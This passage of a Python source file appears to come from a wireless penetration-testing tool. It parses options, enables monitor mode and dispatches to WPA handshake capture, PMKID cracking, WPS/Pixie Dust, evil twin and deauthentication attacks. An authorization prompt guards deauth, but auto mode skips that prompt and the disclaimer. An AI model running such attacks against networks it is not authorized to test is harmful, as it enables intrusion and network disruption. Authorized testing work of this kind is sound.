    parser.add_argument("--session-name", metavar="NAME", help="Custom session name")
    parser.add_argument(
        "--verbose", action="store_true", help="Verbose output (debug mode)"
    )

    # System options
    parser.add_argument(
        "--interfaces", action="store_true", help="List WiFi interfaces and exit"
    )
    parser.add_argument(
        "--check", action="store_true", help="Check system dependencies and exit"
    )
    parser.add_argument(
        "--diagnostics", action="store_true", help="Run wireless diagnostics"
    )
    parser.add_argument(
        "-v", "--version", action="store_true", help="Show version information"
    )
    parser.add_argument("--help-full", action="store_true", help="Show detailed help")

    # Parse arguments
    try:
        args = parser.parse_args()
    except SystemExit as e:
        if e.code == 0:  # Help was shown
            sys.exit(0)
        else:
            print(
                f"\n{Colors.FAILURE} Invalid arguments. Use --help for usage information."
            )
            sys.exit(1)

    # Configure global state from arguments
    if args.verbose:
        state.verbose_mode = True
    if args.auto:
        state.auto_mode = True
    if args.output:
        state.output_directory = os.path.abspath(args.output)
    if args.session_name:
        state.session_id = args.session_name

    # Update configuration from arguments
    if args.deauth_count:
        CONFIG["DEAUTH_COUNT"] = args.deauth_count
    if args.timeout:
        CONFIG["HANDSHAKE_TIMEOUT"] = args.timeout
        CONFIG["WPS_TIMEOUT"] = args.timeout
    if args.scan_time:
        CONFIG["DEFAULT_SCAN_TIME"] = args.scan_time

    # Setup signal handler for graceful cleanup
    signal.signal(signal.SIGINT, signal_handler)

    # Essential system checks
    check_root()
    check_python_version()

    # Show banner (unless in quiet mode operations)
    if not (args.version or args.interfaces or args.check):
        show_banner()

    # Handle special operations first
    if args.version:
        show_version()
        sys.exit(0)

    if args.interfaces:
        if not args.verbose:
            show_banner()
        detect_wireless_cards()
        sys.exit(0)

    if args.check or args.diagnostics:
        if not check_dependencies():
            print(f"\n{Colors.FAILURE} Critical dependencies missing")
            sys.exit(1)

        if args.diagnostics and args.interface:
            state.network_card = args.interface
            wifi_diagnostic()

        sys.exit(0)

    if args.help_full:
        show_help()
        sys.exit(0)

    # Show legal disclaimer (skip in auto mode)
    if not state.auto_mode:
        if not show_disclaimer():
            sys.exit(1)

    # Comprehensive dependency check
    print(f"{Colors.INFO} Checking system dependencies...")
    if not check_dependencies():
        print(
            f"\n{Colors.FAILURE} Please install missing dependencies before continuing"
        )
        sys.exit(1)

    # Interface handling with smart detection
    if args.interface:
        state.network_card = args.interface
        print(
            f"{Colors.SUCCESS} Using interface: {Colors.CYAN}{state.network_card}{Colors.RESET}"
        )
    else:
        # Smart interface detection
        print(f"{Colors.INFO} Auto-detecting wireless interfaces...")
        wireless_cards = []

        code, output, _ = run_command(
            "iwconfig 2>/dev/null | grep -oP '^[a-zA-Z0-9]+(?=\\s+IEEE 802.11)'",
            timeout=10,
        )
        if output.strip():
            wireless_cards = output.strip().split("\n")

        if len(wireless_cards) == 1:
            state.network_card = wireless_cards[0]
            print(
                f"{Colors.SUCCESS} Auto-detected: {Colors.CYAN}{state.network_card}{Colors.RESET}"
            )
        elif len(wireless_cards) > 1:
            print(
                f"{Colors.WARNING} Multiple interfaces found: {Colors.CYAN}{', '.join(wireless_cards)}{Colors.RESET}"
            )

            if state.auto_mode:
                # Use first interface in auto mode
                state.network_card = wireless_cards[0]
                print(
                    f"{Colors.INFO} Auto-selected: {Colors.CYAN}{state.network_card}{Colors.RESET}"
                )
            else:
                print(
                    f"{Colors.INFO} Use {Colors.CYAN}-i <interface>{Colors.RESET} to specify one"
                )
                sys.exit(1)
        else:
            print(f"{Colors.FAILURE} No wireless interfaces found")
            print(
                f"{Colors.INFO} Use {Colors.CYAN}--interfaces{Colors.RESET} to list all network interfaces"
            )
            sys.exit(1)

    # Verify interface exists and is wireless
    code, _, _ = run_command(f"iwconfig {state.network_card} 2>/dev/null", timeout=5)
    if code != 0:
        print(
            f"{Colors.FAILURE} Interface {state.network_card} is not a valid wireless interface"
        )
        sys.exit(1)

    # Enable monitor mode
    print(f"\n{Colors.INFO} Activating monitor mode...")
    if not handle_monitor_mode():
        print(f"{Colors.FAILURE} Monitor mode activation failed")
        print(
            f"{Colors.INFO} Try: {Colors.CYAN}--diagnostics -i {state.network_card}{Colors.RESET}"
        )
        sys.exit(1)

    print(
        f"{Colors.SUCCESS} Monitor mode active: {Colors.CYAN}{state.monitor_interface}{Colors.RESET}"
    )

    # Handle scan-only operation
    if args.scan:
        target = scan_networks(
            args.scan_time, str(args.channel) if args.channel else None
        )
        if target:
            print(
                f"\n{Colors.INFO} Selected: {Colors.CYAN}{target.get('essid', 'Hidden')}{Colors.RESET} ({target.get('bssid')})"
            )
        cleanup_exit(0)

    # Attack mode configuration
    if args.attack:
        state.attack_mode = args.attack.lower()
        print(
            f"{Colors.SUCCESS} Attack mode: {Colors.YELLOW}{args.attack.upper()}{Colors.RESET}"
        )

        # Handle target specification
        if args.target:
            # TODO: Implement target specification by BSSID
            print(
                f"{Colors.INFO} Target BSSID: {Colors.YELLOW}{args.target}{Colors.RESET}"
            )
    else:
        # Interactive mode
        if state.auto_mode:
            print(f"{Colors.FAILURE} Auto mode requires specifying an attack type")
            sys.exit(1)

        # Enhanced interactive menu
        show_interactive_menu()

    # Execute the attack
    success = False

    try:
        if state.attack_mode == "handshake":
            success = attack_handshake()
        elif state.attack_mode == "pmkid":
            success = attack_pmkid_hashcat()
        elif state.attack_mode == "wps":
            success = attack_wps()
        elif state.attack_mode == "pixie":
            success = attack_pixie()
        elif state.attack_mode == "evil_twin":
            success = attack_evil_twin()
        elif state.attack_mode == "deauth":
            # Confirm destructive attack
            if not state.auto_mode:
                print(
                    f"\n{Colors.WARNING} {Colors.RED}WARNING: Deauthentication attack causes network disruption{Colors.RESET}"
                )
                confirm = (
                    input(
                        f"{Colors.YELLOW}Are you authorized to perform this attack? [y/N]: {Colors.RESET}"
                    )
                    .strip()
                    .lower()
                )
                if confirm != "y":
                    print(f"{Colors.INFO} Attack cancelled by user")
                    cleanup_exit(0)
            success = attack_deauth()
        else:
            print(f"{Colors.FAILURE} Unknown attack mode: {state.attack_mode}")
            success = False

        # Results
        if success:
            print(
                f"\n{Colors.SUCCESS} {Colors.GREEN}Attack completed successfully{Colors.RESET}"
            )
            cleanup_exit(0)
        else:
            print(
                f"\n{Colors.FAILURE} {Colors.RED}Attack failed or incomplete{Colors.RESET}"
            )
            cleanup_exit(1)

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING} Operation interrupted by user")
        cleanup_exit(130)  # Standard exit code for SIGINT
    except Exception as e:
        print(f"\n{Colors.FAILURE} Unexpected error: {e}")
        if state.verbose_mode:
            import traceback

            traceback.print_exc()
        cleanup_exit(1)


def show_interactive_menu():
    """Enhanced interactive menu system."""
    show_quick_help()
    print(
        f"{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}"
    )

    while True:
        try:
            cmd = (
                input(
                    f"{Colors.BLUE}wirelesspen{Colors.RESET}{Colors.GRAY}:{state.session_id}{Colors.RESET} > "
                )
                .strip()
                .lower()
            )

            if cmd in ["exit", "quit", "q"]:
                print(f"{Colors.INFO} Goodbye!")
                cleanup_exit(0)
            elif cmd in ["help", "h", "?"]:
                show_quick_help()
            elif cmd == "scan":
                print(f"{Colors.INFO} Scanning networks...")
                scan_networks()
            elif cmd == "handshake":
                state.attack_mode = "handshake"
                break
            elif cmd == "pmkid":
                state.attack_mode = "pmkid"
                break
            elif cmd == "wps":
                state.attack_mode = "wps"
                break
            elif cmd == "pixie":
                state.attack_mode = "pixie"
                break
            elif cmd == "deauth":
                print(f"{Colors.WARNING} WARNING: This will cause network disruption")
                confirm = input(
                    f"{Colors.YELLOW}Authorized for testing? [y/N]: {Colors.RESET}"
                )
                if confirm.lower() == "y":
                    state.attack_mode = "deauth"
                    break
                else:
                    print(f"{Colors.INFO} Attack cancelled")
            elif cmd == "evil_twin":
                state.attack_mode = "evil_twin"
                break
            elif cmd == "interfaces":
                detect_wireless_cards()
            elif cmd == "status":
                show_status()
            elif cmd in ["clear", "cls"]:
                show_banner()
                show_quick_help()
            elif cmd == "verbose":
                state.verbose_mode = not state.verbose_mode
                print(
                    f"{Colors.INFO} Verbose mode: {Colors.CYAN}{'ON' if state.verbose_mode else 'OFF'}{Colors.RESET}"
                )
            elif cmd == "":
                continue
            else:
                print(f"{Colors.FAILURE} Unknown command: {cmd}")
                print(
                    f"{Colors.GRAY}    Type 'help' for available commands{Colors.RESET}"
                )
        except KeyboardInterrupt:
            cleanup_exit(130)
        except EOFError:
            cleanup_exit(0)


def show_status():
    """Show current session status."""
    uptime = int(time.time() - state.script_start_time)
    uptime_str = time.strftime("%H:%M:%S", time.gmtime(uptime))

    print(f"\n{Colors.CYAN}📊 SESSION STATUS:{Colors.RESET}")
    print(f"  Session ID:     {state.session_id}")
    print(f"  Uptime:         {uptime_str}")
    print(f"  Interface:      {state.network_card or 'None'}")
    print(f"  Monitor Mode:   {state.monitor_interface or 'Inactive'}")
    print(f"  Attack Mode:    {state.attack_mode or 'None'}")
    print(
        f"  Target:         {state.target_network.get('essid', 'None') if state.target_network else 'None'}"
    )
    print(f"  Output Dir:     {state.output_directory}")
    print(f"  Verbose Mode:   {'ON' if state.verbose_mode else 'OFF'}")
    print(f"  Auto Mode:      {'ON' if state.auto_mode else 'OFF'}")
    print()


if __name__ == "__main__":
    main()
